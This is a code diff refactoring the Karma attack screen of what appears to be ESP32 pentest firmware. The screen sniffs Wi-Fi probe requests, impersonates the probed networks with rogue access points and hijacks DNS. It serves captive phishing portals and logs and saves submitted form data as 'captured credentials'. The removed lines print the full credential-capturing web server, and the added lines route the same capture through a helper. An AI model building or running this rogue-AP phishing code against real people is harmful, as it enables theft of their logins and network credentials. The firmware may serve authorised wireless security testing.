@@ -4,11 +4,8 @@
 #include "screens/wifi/WifiMenuScreen.h"
 #include "ui/actions/ShowStatusAction.h"
 #include "ui/actions/InputNumberAction.h"
-#include "utils/StorageUtil.h"
 
 #include <WiFi.h>
-#include <DNSServer.h>
-#include <ESPAsyncWebServer.h>
 
 WifiKarmaScreen* WifiKarmaScreen::_instance = nullptr;
 
@@ -18,6 +15,26 @@ WifiKarmaScreen::~WifiKarmaScreen()
 {
   _stopAttack();
   _instance = nullptr;
+}
+
+// ── Callbacks ───────────────────────────────────────────────────────────────
+
+void WifiKarmaScreen::_onVisit(void* ctx)
+{
+  auto* self = static_cast<WifiKarmaScreen*>(ctx);
+  self->_log.addLine("[+] Portal visited");
+}
+
+void WifiKarmaScreen::_onPost(const String& data, void* ctx)
+{
+  auto* self = static_cast<WifiKarmaScreen*>(ctx);
+  self->_log.addLine("[+] Credential captured!");
+  if (Uni.Speaker) Uni.Speaker->playNotification();
+
+  String ssid = (self->_currentIdx < self->_ssidCount)
+    ? String(self->_ssids[self->_currentIdx]) : "unknown";
+  self->_portal.saveCaptured(data, "karma_" + ssid);
+  self->_inputStartTime = millis();
 }
 
 // ── Lifecycle ───────────────────────────────────────────────────────────────
@@ -38,7 +55,16 @@ void WifiKarmaScreen::onItemSelected(uint8_t index)
         _menuItems[0].sublabel = _saveListSub.c_str();
         render();
         break;
-      case 1: _selectPortal(); break;
+      case 1: { // Portal
+        _state = STATE_SELECT_PORTAL;
+        if (_portal.selectPortal()) {
+          _showMenu();
+        } else {
+          _state = STATE_MENU;
+          render();
+        }
+        break;
+      }
       case 2: {
         int val = InputNumberAction::popup("Wait Connect (s)", 5, 120, _waitConnect);
         if (val >= 5) _waitConnect = val;
@@ -53,9 +79,6 @@ void WifiKarmaScreen::onItemSelected(uint8_t index)
       }
       case 4: _startAttack(); break;
     }
-  } else if (_state == STATE_SELECT_PORTAL && index < _portalCount) {
-    _portalFolder = _portalNames[index];
-    _showMenu();
   }
 }
 
@@ -65,7 +88,6 @@ void WifiKarmaScreen::onUpdate()
     ListScreen::onUpdate();
     return;
   }
-
 
   // Handle exit
   if (Uni.Nav->wasPressed()) {
@@ -78,7 +100,7 @@ void WifiKarmaScreen::onUpdate()
   }
 
   // DNS
-  if (_dns) _dns->processNextRequest();
+  _portal.processDns();
 
   unsigned long now = millis();
 
@@ -91,27 +113,27 @@ void WifiKarmaScreen::onUpdate()
       _inputStartTime = now;
       char buf[60];
       snprintf(buf, sizeof(buf), "[+] Client connected to: %s", _ssids[_currentIdx]);
-      _addLog(buf);
+      _log.addLine(buf);
       if (Uni.Speaker) Uni.Speaker->playNotification();
     }
 
-    // Phase 1: waiting for device to connect (no client yet)
+    // Phase 1: waiting for device to connect
     if (!_clientConnected) {
       if (now - _apStartTime > (unsigned long)_waitConnect * 1000) {
         char buf[60];
         snprintf(buf, sizeof(buf), "[-] Timeout: %s", _ssids[_currentIdx]);
-        _addLog(buf);
+        _log.addLine(buf);
         _blacklistSSID(_ssids[_currentIdx]);
         _teardownAP();
         _currentIdx++;
       }
     }
-    // Phase 2: client connected, waiting for form input
+    // Phase 2: waiting for form input
     else {
       if (now - _inputStartTime > (unsigned long)_waitInput * 1000) {
         char buf[60];
         snprintf(buf, sizeof(buf), "[-] Input timeout: %s", _ssids[_currentIdx]);
-        _addLog(buf);
+        _log.addLine(buf);
         _blacklistSSID(_ssids[_currentIdx]);
         _teardownAP();
         _currentIdx++;
@@ -119,7 +141,7 @@ void WifiKarmaScreen::onUpdate()
     }
   }
 
-  // Deploy next available SSID if AP is not active
+  // Deploy next available SSID
   if (!_apActive) {
     while (_currentIdx < _ssidCount) {
       if (!_isBlacklisted(_ssids[_currentIdx])) {
@@ -155,7 +177,7 @@ void WifiKarmaScreen::_showMenu()
 {
   _state = STATE_MENU;
   _saveListSub    = _saveList ? "On" : "Off";
-  _portalSub      = _portalFolder.isEmpty() ? "-" : _portalFolder;
+  _portalSub      = _portal.portalFolder().isEmpty() ? "-" : _portal.portalFolder();
   _waitConnectSub = String(_waitConnect) + "s";
   _waitInputSub   = String(_waitInput) + "s";
 
@@ -167,63 +189,6 @@ void WifiKarmaScreen::_showMenu()
   setItems(_menuItems, 5);
 }
 
-// ── Portal Selection ────────────────────────────────────────────────────────
-
-void WifiKarmaScreen::_selectPortal()
-{
-  _state = STATE_SELECT_PORTAL;
-
-  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
-    ShowStatusAction::show("No storage available");
-    _showMenu();
-    return;
-  }
-
-  IStorage::DirEntry entries[MAX_PORTALS];
-  uint8_t count = Uni.Storage->listDir("/unigeek/wifi/portals", entries, MAX_PORTALS);
-
-  _portalCount = 0;
-  for (int i = 0; i < count && _portalCount < MAX_PORTALS; i++) {
-    if (entries[i].isDir) {
-      _portalNames[_portalCount] = entries[i].name;
-      _portalItems[_portalCount] = {_portalNames[_portalCount].c_str()};
-      _portalCount++;
-    }
-  }
-
-  if (_portalCount == 0) {
-    ShowStatusAction::show("No portals found\nWiFi > Network > Download\n> Firmware Sample Files");
-    _showMenu();
-    return;
-  }
-
-  setItems(_portalItems, _portalCount);
-}
-
-// ── Portal HTML ─────────────────────────────────────────────────────────────
-
-void WifiKarmaScreen::_loadPortalHtml()
-{
-  _portalBasePath = "";
-  if (!_portalFolder.isEmpty() && Uni.Storage && Uni.Storage->isAvailable()) {
-    _portalBasePath = "/unigeek/wifi/portals/" + _portalFolder;
-    String path = _portalBasePath + "/index.htm";
-    if (Uni.Storage->exists(path.c_str())) {
-      _portalHtml = Uni.Storage->readFile(path.c_str());
-      String successPath = _portalBasePath + "/success.htm";
-      if (Uni.Storage->exists(successPath.c_str())) {
-        _successHtml = Uni.Storage->readFile(successPath.c_str());
-      } else {
-        _successHtml = "<html><body><h2>Connected!</h2></body></html>";
-      }
-      return;
-    }
-  }
-  _portalBasePath = "";
-  _portalHtml  = "";
-  _successHtml = "";
-}
-
 // ── Probe Sniffer ───────────────────────────────────────────────────────────
 
 void IRAM_ATTR WifiKarmaScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type)
@@ -233,7 +198,6 @@ void IRAM_ATTR WifiKarmaScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_t
   const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
   const uint8_t* frame = pkt->payload;
 
-  // Probe Request: frame type 0x40
   if (frame[0] != 0x40) return;
 
   uint8_t ssidLen = frame[25];
@@ -243,7 +207,6 @@ void IRAM_ATTR WifiKarmaScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_t
   memcpy(ssid, &frame[26], ssidLen);
   ssid[ssidLen] = '\0';
 
-  // Skip empty/whitespace SSIDs
   bool allSpace = true;
   for (int i = 0; i < ssidLen; i++) {
     if (ssid[i] != ' ') { allSpace = false; break; }
@@ -255,14 +218,10 @@ void IRAM_ATTR WifiKarmaScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_t
 
 void WifiKarmaScreen::_onProbe(const char* ssid)
 {
-  // Dedup check
   for (int i = 0; i < _ssidCount; i++) {
     if (strcmp(_ssids[i], ssid) == 0) return;
   }
-
-  // Skip if blacklisted
   if (_isBlacklisted(ssid)) return;
-
   if (_ssidCount >= MAX_SSIDS) return;
 
   strncpy(_ssids[_ssidCount], ssid, 32);
@@ -272,7 +231,7 @@ void WifiKarmaScreen::_onProbe(const char* ssid)
 
   char buf[60];
   snprintf(buf, sizeof(buf), "[*] Probe: %s", ssid);
-  _addLog(buf);
+  _log.addLine(buf);
 
   if (_saveList) _saveSSIDToFile(ssid);
 }
@@ -291,7 +250,7 @@ void WifiKarmaScreen::_startSniffing()
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);
 
-  _addLog("[*] Sniffing probes...");
+  _log.addLine("[*] Sniffing probes...");
 }
 
 void WifiKarmaScreen::_stopSniffing()
@@ -312,13 +271,9 @@ void WifiKarmaScreen::_deployAP(const char* ssid)
 
   IPAddress apIP = WiFi.softAPIP();
 
-  if (!_dns) {
-    _dns = new DNSServer();
-    _dns->start(53, "*", apIP);
-  }
-
-  if (!_server) {
-    _setupWebServer();
+  // Start portal server if not already running
+  if (!_portal.server()) {
+    _portal.start(apIP);
   }
 
   _apActive = true;
@@ -327,22 +282,12 @@ void WifiKarmaScreen::_deployAP(const char* ssid)
 
   char buf[60];
   snprintf(buf, sizeof(buf), "[>] AP: %s (%ds)", ssid, _waitConnect);
-  _addLog(buf);
+  _log.addLine(buf);
 }
 
 void WifiKarmaScreen::_teardownAP()
 {
-  if (_server) {
-    _server->end();
-    delete _server;
-    _server = nullptr;
-  }
-  if (_dns) {
-    _dns->stop();
-    delete _dns;
-    _dns = nullptr;
-  }
-
+  _portal.stop();
   WiFi.softAPdisconnect(true);
   _apActive = false;
   _clientConnected = false;
@@ -350,70 +295,11 @@ void WifiKarmaScreen::_teardownAP()
   _startSniffing();
 }
 
-void WifiKarmaScreen::_setupWebServer()
-{
-  _server = new AsyncWebServer(80);
-
-  auto servePortalSilent = [this](AsyncWebServerRequest* req) {
-    if (_portalHtml.length() > 0)
-      req->send(200, "text/html", _portalHtml);
-    else
-      req->send(200, "text/html", "<html><body><h2>Connected</h2></body></html>");
-  };
-
-  _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* req) {
-    _visitCount++;
-    char buf[60];
-    snprintf(buf, sizeof(buf), "[+] Visit %s", req->client()->remoteIP().toString().c_str());
-    _addLog(buf);
-    if (_portalHtml.length() > 0)
-      req->send(200, "text/html", _portalHtml);
-    else
-      req->send(200, "text/html", "<html><body><h2>Connected</h2></body></html>");
-  });
-  _server->on("/generate_204", HTTP_GET, servePortalSilent);
-  _server->on("/fwlink", HTTP_GET, servePortalSilent);
-  _server->on("/hotspot-detect.html", HTTP_GET, servePortalSilent);
-  _server->on("/connecttest.txt", HTTP_GET, servePortalSilent);
-
-  // Handle POST — capture credentials
-  _server->on("/", HTTP_POST, [this](AsyncWebServerRequest* req) {
-    String data;
-    for (int i = 0; i < (int)req->params(); i++) {
-      const AsyncWebParameter* p = req->getParam(i);
-      if (!p->isPost()) continue;
-      if (data.length() > 0) data += "\n";
-      data += p->name() + "=" + p->value();
-    }
-    _postCount++;
-
-    char buf[60];
-    snprintf(buf, sizeof(buf), "[+] POST %s", req->client()->remoteIP().toString().c_str());
-    _addLog(buf);
-
-    _saveCaptured(data);
-    _inputStartTime = millis();
-    req->send(200, "text/html", _successHtml.length() > 0 ? _successHtml
-      : String("<html><body><h2>Connected!</h2></body></html>"));
-  });
-
-  // Serve static files from portal folder
-  if (Uni.Storage && Uni.Storage->isAvailable() && !_portalBasePath.isEmpty()) {
-    _server->serveStatic("/", Uni.Storage->getFS(), _portalBasePath.c_str());
-  }
-
-  _server->onNotFound([](AsyncWebServerRequest* req) {
-    req->redirect("/");
-  });
-
-  _server->begin();
-}
-
 // ── Start / Stop ────────────────────────────────────────────────────────────
 
 void WifiKarmaScreen::_startAttack()
 {
-  if (_portalFolder.isEmpty()) {
+  if (_portal.portalFolder().isEmpty()) {
     ShowStatusAction::show("Select a portal first!");
     return;
   }
@@ -423,19 +309,18 @@ void WifiKarmaScreen::_startAttack()
   }
 
   _state = STATE_RUNNING;
-  _logCount       = 0;
+  _log.clear();
   _ssidCount      = 0;
   _blacklistCount = 0;
   _currentIdx     = 0;
   _capturedCount  = 0;
-  _visitCount     = 0;
-  _postCount      = 0;
   _apActive       = false;
   _lastDraw       = 0;
 
-  _loadPortalHtml();
-  _addLog("[*] Karma Attack started");
-  _addLog("[*] BACK/Press to stop");
+  _portal.setCallbacks(_onVisit, _onPost, this);
+  _portal.loadPortalHtml();
+  _log.addLine("[*] Karma Attack started");
+  _log.addLine("[*] BACK/Press to stop");
   _startSniffing();
 
   _drawLog();
@@ -444,17 +329,7 @@ void WifiKarmaScreen::_startAttack()
 void WifiKarmaScreen::_stopAttack()
 {
   _stopSniffing();
-
-  if (_server) {
-    _server->end();
-    delete _server;
-    _server = nullptr;
-  }
-  if (_dns) {
-    _dns->stop();
-    delete _dns;
-    _dns = nullptr;
-  }
+  _portal.stop();
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_OFF);
 
@@ -463,9 +338,6 @@ void WifiKarmaScreen::_stopAttack()
   _ssidCount      = 0;
   _blacklistCount = 0;
   _currentIdx     = 0;
-  _portalHtml     = "";
-  _successHtml    = "";
-  _portalBasePath = "";
 }
 
 // ── Save to file ────────────────────────────────────────────────────────────
@@ -474,7 +346,7 @@ void WifiKarmaScreen::_saveSSIDToFile(const char* ssid)
 {
   if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
   if (!StorageUtil::hasSpace()) {
-    _addLog("[!] Storage full, skip save");
+    _log.addLine("[!] Storage full, skip save");
     return;
   }
 
@@ -494,30 +366,6 @@ void WifiKarmaScreen::_saveSSIDToFile(const char* ssid)
   fs::File f = Uni.Storage->open(path.c_str(), FILE_APPEND);
   if (f) {
     f.println(line);
-    f.close();
-  }
-}
-
-void WifiKarmaScreen::_saveCaptured(const String& data)
-{
-  _addLog("[+] Credential captured!");
-  if (Uni.Speaker) Uni.Speaker->playNotification();
-
-  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
-  if (!StorageUtil::hasSpace()) {
-    _addLog("[!] Storage full, skip save");
-    return;
-  }
-
-  Uni.Storage->makeDir("/unigeek/wifi/captives");
-
-  String ssid = (_currentIdx < _ssidCount) ? String(_ssids[_currentIdx]) : "unknown";
-  String filename = "/unigeek/wifi/captives/karma_" + ssid + ".txt";
-
-  fs::File f = Uni.Storage->open(filename.c_str(), FILE_APPEND);
-  if (f) {
-    f.println("---");
-    f.println(data);
     f.close();
   }
 }
@@ -542,60 +390,23 @@ void WifiKarmaScreen::_blacklistSSID(const char* ssid)
 
 // ── Log Display ─────────────────────────────────────────────────────────────
 
-void WifiKarmaScreen::_addLog(const char* msg)
-{
-  if (_logCount < MAX_LOG) {
-    strncpy(_logLines[_logCount], msg, 59);
-    _logLines[_logCount][59] = '\0';
-    _logCount++;
-  } else {
-    for (int i = 0; i < MAX_LOG - 1; i++) {
-      memcpy(_logLines[i], _logLines[i + 1], 60);
-    }
-    strncpy(_logLines[MAX_LOG - 1], msg, 59);
-    _logLines[MAX_LOG - 1][59] = '\0';
-  }
-}
-
 void WifiKarmaScreen::_drawLog()
 {
-  TFT_eSprite sp(&Uni.Lcd);
-  sp.createSprite(bodyW(), bodyH());
-  sp.fillSprite(TFT_BLACK);
-
-  int lineH    = 10;
-  int statusH  = 14;
-  int logAreaH = bodyH() - statusH;
-  int maxVisible = logAreaH / lineH;
-  int startIdx   = _logCount > maxVisible ? _logCount - maxVisible : 0;
-
-  sp.setTextDatum(TL_DATUM);
-  sp.setTextColor(TFT_WHITE, TFT_BLACK);
-  for (int i = startIdx; i < _logCount; i++) {
-    int y = (i - startIdx) * lineH;
-    sp.drawString(_logLines[i], 2, y, 1);
-  }
-
-  // Separator
-  int sepY = bodyH() - statusH;
-  sp.drawFastHLine(0, sepY, bodyW(), TFT_DARKGREY);
-
-  // Status bar: AP:X  V:X  P:X  | current SSID
-  int barY = sepY + 2;
-  sp.setTextColor(TFT_GREEN, TFT_BLACK);
-  sp.setTextDatum(TL_DATUM);
-
-  char stats[40];
-  snprintf(stats, sizeof(stats), "AP:%d V:%d P:%d", _capturedCount, _visitCount, _postCount);
-  sp.drawString(stats, 2, barY, 1);
-
-  sp.setTextDatum(TR_DATUM);
-  if (_apActive && _currentIdx < _ssidCount) {
-    sp.drawString(String(_ssids[_currentIdx]).substring(0, 14), bodyW() - 2, barY, 1);
-  } else {
-    sp.drawString("Sniffing...", bodyW() - 2, barY, 1);
-  }
-
-  sp.pushSprite(bodyX(), bodyY());
-  sp.deleteSprite();
+  auto* self = this;
+  _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
+    [](TFT_eSprite& sp, int barY, int w, void* ud) {
+      auto* s = static_cast<WifiKarmaScreen*>(ud);
+      sp.setTextColor(TFT_GREEN, TFT_BLACK);
+      sp.setTextDatum(TL_DATUM);
+      char stats[40];
+      snprintf(stats, sizeof(stats), "AP:%d V:%d P:%d",
+               s->_capturedCount, s->_portal.visitCount(), s->_portal.postCount());
+      sp.drawString(stats, 2, barY, 1);
+      sp.setTextDatum(TR_DATUM);
+      if (s->_apActive && s->_currentIdx < s->_ssidCount) {
+        sp.drawString(String(s->_ssids[s->_currentIdx]).substring(0, 14), w - 2, barY, 1);
+      } else {
+        sp.drawString("Sniffing...", w - 2, barY, 1);
+      }
+    }, self);
 }
